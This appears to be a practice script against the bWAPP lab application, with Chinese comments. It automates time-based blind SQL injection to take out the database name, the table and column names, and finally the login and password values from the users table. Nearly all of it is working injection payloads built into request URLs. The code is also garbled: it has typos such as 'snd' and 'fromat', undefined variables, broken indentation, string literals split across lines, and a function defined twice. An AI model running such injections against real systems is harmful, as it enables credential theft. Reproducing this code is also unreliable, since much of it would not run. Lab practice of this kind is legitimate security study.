# -*- coding: utf-8 -*-

__author__ = 'Micheal'

import requests
import time

HEADER = {
    "Cookie":"PHPSESSID=ib25n1buakkvhof8ad9uonpuc5; security_level=0"
     }


BASE_URL = 'http://127.0.0.1/bwapp/sqli_15.php'
# http://127.0.0.1/bwapp/sqli_15.php?title=a&action=search







# 获取数据库的长度
def get_database_name_length() ->int:
     count = 0
     # Iron Man'and length(database())=? and sleep(2) --
     for i in range(100):
          url = BASE_URL+"title=Iron Man' snd leength(database())={}and sleep(2) -- &action=search".fromat(i,j)
          start_time = time.time()
          requests.get(url,headers=HEADER)
          if time.time() - start_time > 1:
               print("长度为{}".format(i))
               count = i
     return count


#  获取数据库名称
def get_database_name(count):
     # ascii 33 - 127
     for i in range(count + 1):
          for j in range(33,127):
               #已知数据长度count
                url = BASE_URL+"title=Iron Man' snd ascii(substr(database(),{},1)) ={} and sleep(2) -- &action=search".fromat(i,j)
               start_time = time.time()
               requests.get(url,headers=HEADER)
               if time.time() - start_time > 1:
                    print(chr(j))
               

#获取当前数据库的所有表
#先取当前数据库一共有多少表
def get_table_count() -> int:
     count = 0
     for i in range(100):
          url = BASE_URL + "title=Iron Man' and (select count(table_name) from information_schema.tables where
table_schema=database())={} and sleep(2) -- &action=search".format(i)          
          start_time = time.time()
          requests.get(url,headers=HEADER)
          if time.time() - start_time >1:
               print("一共有{}个表".format(i))
               count = i
     return count

# 获取每张表的长度
def get_table_length_of_each_table(count):
     for i in range(count + 1):
          for j in range(100):
               url =BASE_URL +"title=Iron Man' and (select length(table_name) from information_schema.tables where
table_schema=database() limit {},1)={} and sleep(2) -- &action=search".format(i,j)
               start_time = time.time()
               requests.get(url,headers=HEADER)
               if time.time() - start_time > 1:
                    print("="*20)
                    get_table_name_of_each_table(i,j)
                    print("表长度为{}".format(j))
                    print("="*20)


# 获取每张的名称
def get_table_name_of_each_table(index,count):
     for i in range(count + 1):
          for j in range(33,127):
               url  = BASE_URL + "title=Iron Man' and ascii(substr(select table_name from information_schema.tables where
table_schema=database() limit {},1),{},1))={} and sleep(2) -- &action=search".format(index,i,j)
               start_time = time.time()
               requests.get(url,headers=HEADER)
               if time.time() - start_time > 1:
                    print(chr(j))


# 已知表名users最重要 ，里面有我们要获取的信息
# 1.获取users表里的所有字段
# 2.分析那些字段有用 login password
# 3.查询有用字段的值
def get_column_count():
     count = 0
     # Iron Man' and length(database())=? and sleep(2)--
     for i in range(100):
          url = BASE_URL  + "title=Iron Man' and （select count(column_name) from information_schema.columns where
table_name='users'）={} and sleep(2) -- &action=search".format(i)
          start_time = time.time()
          requests.get(url,headers=HEADER)
          if time.time() - start_time > 1:
               print("字段个数为{}".format(i))
               count = i
     return count


# 获取users表每个字段长度
def get_column_length_of_each_column(count):
     for i in range(count +1):
          for j in range(100):
               url = BASE_URL +"title=Iron man'and (select length(column_name) from information_schema.columns where
table_name='users' limit {},1 )={} and sleep(2) -- &action=search".format(i,j)
          start_time = time.time()
          requests.get(url,headers=HEADER)
          if time.time() - start_time > 1:
               print("="*20)
              # get_column_name_of_each_column(i,j)  # 获取每个字段的名称
               print("user表,字段长度为{}".format(j))
               print("="*20)
               

# 获取每个字段的名称
def get_table_name_of_each_table(index,count):
     for i in range(count + 1):
          for j in range(33,127):
               url  = BASE_URL + "title=Iron Man' and ascii(substr(select column_name from information_schema.columns where
table_schema='users' limit {},1),{},1))={} and sleep(2) -- &action=search".format(index,i,j)
               start_time = time.time()
               requests.get(url,headers=HEADER)
               if time.time() - start_time > 1:
                    print(chr(j))


def get_username_and_password():
     for i in range(100):
          for j in range(33,127):
                url  = BASE_URL + "title=Iron Man' and ascii(substr((select concat(login,password) from users limit 0,1),{},1))={} and sleep(2) -- &action=search".format(i,j)
               requests.get(url)
               start_time = time.time()
               requests.get(url,headers=HEADER)
               if time.time() - start_time > 1:
                    print(chr(j))






if __name__ == '__main__':
     #get_database_name_length()#获取数据库名字数长度

    # get_database_name(get_database_name_length())
    # get_table_count() # 获取表名长度
    # get_table_length_of_each_table(get_table_count())
    #get_column_count() # 获取字段长度
     #get_column_length_of_each_column(get_column_count()）
     #get_table_name_of_each_table(get_column_count())
      get_username_and_password()                                                 
 







##def get_column_count():
##    count = 0
##    # Iron Man' and length(database())=? and sleep(2) --
##    for i in range(100):
##        url = BASE_URL + "title = Iron Man' and length(database())={} and sleep(2) -- &action=search".format(i)
##        start_time = time.time()
##        requests.get(url,headers=HEADER)
##        if time.time() - start_time > 1:
##            print("长度为{}".format(i))
##            count = i
##    return count
##
##
##
##def get_column_count():
##    count = 0
##    # Iron Man' and length(database())=? and sleep(2) --
##    for i in range(100):
##        url = BASE_URL + "title = Iron Man' and (select count(column_name) from information_schema.columns where table_name = 'users')={} and sleep(2) -- &action=search".format(i)
##        start_time = time.time()
##        requests.get(url,headers=HEADER)
##        if time.time() - start_time > 1:
##            print("字段个数为{}".format(i))
##            count = i
##    return count
##
##


##if __name__=='__main__':
##    get_database_name_length()

    # get_database_name(get_database_name_length())
    # get_table_count() # 获取表名长度
    # get_table_length_of_each_table(get_table_count())
    #get_column_count() # 获取字段长度



    
